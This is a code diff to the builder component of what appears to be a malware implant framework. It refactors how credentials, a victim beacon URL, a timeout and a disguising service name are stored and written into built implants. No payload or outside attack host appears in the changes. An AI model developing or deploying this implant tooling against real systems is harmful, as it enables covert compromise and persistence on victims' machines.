@@ -1,7 +1,9 @@
 #include "Builder.hpp"
+#include "Config.hpp"
 #include "LogManager.hpp"
 #include "Types.hpp"
 #include <ImplantConfig.hpp>
+#include <UrlUtils.hpp>
 
 #include <elfio/elfio.hpp>
 
@@ -24,7 +26,19 @@ Builder::Builder(const std::string& db_path) :
     m_conf( Config::instance(db_path)),
     m_log_man( LogManager::instance())
 {
+    syncConfigFromStorage();
+}
 
+//--------------------------------
+//
+//--------------------------------
+void Builder::syncConfigFromStorage() {
+    setUsername(getUsername());
+    setPassword(getPassword());
+    setTimeout(getTimeout());
+    setServerURL(getServerURL());
+    setServiceName(getServiceName());
+    setServiceDesc(getServiceDesc());
 }
 
 //-------------------------------------------------
@@ -45,7 +59,15 @@ std::string Builder::getPassword() const noexcept {
 //
 //-------------------------------------------------
 std::string Builder::getServerURL() const noexcept {
-    return m_conf.get<std::string>("implant_url", "https://127.0.0.1:3000");
+    const auto default_url = make_victim_beacon_url("https://127.0.0.1", getVictimApiPort());
+    return m_conf.get<std::string>(Key::client_implant_url_key, default_url);
+}
+
+//-------------------------------------------------
+//
+//-------------------------------------------------
+uint16_t Builder::getVictimApiPort() const noexcept {
+    return static_cast<uint16_t>(m_conf.get<int>(Key::client_victim_api_port_key, 3000));
 }
 
 //-------------------------------------------------
@@ -114,9 +136,16 @@ void Builder::setTimeout(const std::string& timeout) {
 //
 //--------------------------------
 void Builder::setServerURL(const std::string& server_url) {
-    std::strncpy(m_config.server_url, server_url.c_str(), std::size(m_config.server_url) - 1);
+    auto normalized_url = strip_trailing_slash(server_url);
+    if (normalized_url.empty()) {
+        normalized_url = make_victim_beacon_url("https://127.0.0.1", getVictimApiPort());
+    } else if (!url_has_explicit_port(normalized_url)) {
+        normalized_url = make_victim_beacon_url(normalized_url, getVictimApiPort());
+    }
+
+    std::strncpy(m_config.server_url, normalized_url.c_str(), std::size(m_config.server_url) - 1);
     m_config.server_url[sizeof(m_config.server_url) - 1] = '\0';
-    m_conf.set("implant_url", server_url);
+    m_conf.set(Key::client_implant_url_key, normalized_url, true);
 }
 
 //--------------------------------
@@ -190,26 +219,33 @@ bool Builder::buildImplant() {
         return false;
     }
 
-    // prepare the new configuration data
-    ImplantConfig new_config;
+    syncConfigFromStorage();
 
-    // use strncpy to safely copy and null-terminate the strings
-    std::strncpy(new_config.username, m_config.username, sizeof(new_config.username) - 1);
+    const auto username = getUsername();
+    const auto password = getPassword();
+    const auto timeout = getTimeout();
+    const auto server_url = getServerURL();
+    const auto service_name = getServiceName();
+    const auto service_desc = getServiceDesc();
+
+    ImplantConfig new_config{};
+
+    std::strncpy(new_config.username, username.c_str(), sizeof(new_config.username) - 1);
     new_config.username[sizeof(new_config.username) - 1] = '\0';
 
-    std::strncpy(new_config.password, m_config.password, sizeof(new_config.password) - 1);
+    std::strncpy(new_config.password, password.c_str(), sizeof(new_config.password) - 1);
     new_config.password[sizeof(new_config.password) - 1] = '\0';
 
-    std::strncpy(new_config.default_timeout, m_config.default_timeout, sizeof(new_config.default_timeout) - 1);
+    std::strncpy(new_config.default_timeout, timeout.c_str(), sizeof(new_config.default_timeout) - 1);
     new_config.default_timeout[sizeof(new_config.default_timeout) - 1] = '\0';
 
-    std::strncpy(new_config.server_url, m_config.server_url, sizeof(new_config.server_url) - 1);
+    std::strncpy(new_config.server_url, server_url.c_str(), sizeof(new_config.server_url) - 1);
     new_config.server_url[sizeof(new_config.server_url) - 1] = '\0';
 
-    std::strncpy(new_config.service_name, m_config.service_name, sizeof(new_config.service_name) - 1);
+    std::strncpy(new_config.service_name, service_name.c_str(), sizeof(new_config.service_name) - 1);
     new_config.service_name[sizeof(new_config.service_name) - 1] = '\0';
 
-    std::strncpy(new_config.service_desc, m_config.service_desc, sizeof(new_config.service_desc) - 1);
+    std::strncpy(new_config.service_desc, service_desc.c_str(), sizeof(new_config.service_desc) - 1);
     new_config.service_desc[sizeof(new_config.service_desc) - 1] = '\0';
 
 
